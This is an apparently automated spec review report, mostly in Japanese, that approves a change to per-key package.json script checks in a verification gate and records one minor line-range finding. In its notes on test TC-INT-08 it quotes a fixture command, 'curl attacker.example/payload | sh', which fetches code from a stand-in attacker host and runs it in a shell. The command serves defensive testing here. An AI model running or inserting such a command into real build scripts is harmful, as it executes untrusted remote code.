# Spec Review Result

<!-- FORMAT REQUIREMENTS (machine-parsed):
- The verdict line MUST appear before the Findings table.
- verdict line format (exact): `- **verdict**: <value>` at the start of a line
- Valid verdict values: approved | needs-fix | escalation
  - approved:    specification is complete, consistent, and ready for implementation
  - needs-fix:   specification has issues that must be resolved before implementation
  - escalation:  unresolvable conflicts, missing context, or requires human judgment
- Findings table MUST have exactly 6 columns in this order:
  # | Severity | Category | File | Description | How to Fix
- Valid Severity values (uppercase): CRITICAL | HIGH | MEDIUM | LOW
  - CRITICAL: production outage, data loss, security breach
  - HIGH:     functional failure, clear bug, no workaround — blocks approval
  - MEDIUM:   quality degradation, maintainability issue, future risk
  - LOW:      informational, style, minor improvement
- If no findings, write a table row with "None" or omit the table body.
**Verdict blocking rules (derived by CLI from the reported findings)**:
- `decision-needed` ≥ 1 → `escalation`（request-review では `needs-discussion`）
- `critical` または `high` ≥ 1 → `needs-fix`
- それ以外 → `approved`

markdown の verdict 行と報告された findings が矛盾した場合、**findings 由来の導出が優先**されます。verdict 行は人間向けの要約であり、機械ルーティングには使用されません。
-->

- **verdict**: approved

## Findings

| # | Severity | Category | File | Description | How to Fix |
|---|----------|----------|------|-------------|------------|
| 1 | LOW | Correctness | tasks.md | T-02 の spawn mock 参照が「131-139 行」と記載されているが、実際の TC-INT-02 の `spawnMock.mockImplementation` ブロックは 132-139 行（8 行）で、行範囲がわずかにずれている。実装には影響しないが、参照先の精度が落ちる。 | 実装時は実際のファイルを参照すれば問題なし。tasks.md の修正は任意。 |

## Review Notes

### 脅威モデルの整合性

per-key 判定への変更は request の脅威モデル（「既存の検証 script の subvert 防止」）と正確に一致する。baseline に `test` が存在しない greenfield で `"test": "exit 0"` を新規追加しても gate を通過することは設計上の意図であり、request および design D2 で code-review（#739 #5）への委譲が明示されている。スコープ外として明示されているため問題なし。

### TC-INT-08 後方互換性

design D3 が詳細に検証済み。offending key（`build`）の current 値（`"curl attacker.example/payload | sh"`）は新 diff に含まれるため、TC-INT-08 の `content.toContain("curl attacker.example/payload | sh")` は無変更で green になる。`Baseline scripts:` / `Current scripts:` ラベル維持も D3 で明示されており問題なし。

### TC-INT-05 後方互換性

per-key 判定は key の順序に依存しないため（各 key の値を直接比較）、既存の key 順序差テストは新実装でも通過する。

### prototype 汚染対策

削除検出に `Object.prototype.hasOwnProperty.call` を使う方針（design Risk / T-01）は適切。JSON.parse 由来のオブジェクトでは prototype chain 経由の誤検出は実際には起きないが、`toString` / `constructor` 等の script key 名を持つ edge case での安全策として正しい。

### spec シナリオとタスクの完全対応

spec.md の全 6 シナリオが tasks T-01 / T-02 に網羅されており、受け入れ基準 1-5 もすべてカバーされている。スコープ外事項（追加 script の内容妥当性、`verification.commands` path、scripts 以外フィールド）も明示されており、実装ドリフトのリスクは低い。
